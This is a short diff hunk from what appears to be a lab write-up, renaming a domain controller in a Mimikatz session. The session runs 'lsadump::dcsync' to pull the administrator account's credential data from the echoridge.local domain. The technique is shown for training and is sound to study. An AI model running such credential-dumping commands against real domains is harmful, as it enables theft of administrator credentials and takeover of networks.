@@ -98,7 +98,7 @@ Privilege '20' OK
 
 mimikatz # lsadump::dcsync /domain:echoridge.local /user:echoridge\administrator
 [DC] 'echoridge.local' will be the domain
-[DC] 'ACADEMY-EA-DC01.echoridge.local' will be the DC server
+[DC] 'DC01.echoridge.local' will be the DC server
 [DC] 'echoridge\administrator' will be the user account
 
 Object RDN           : Administrator
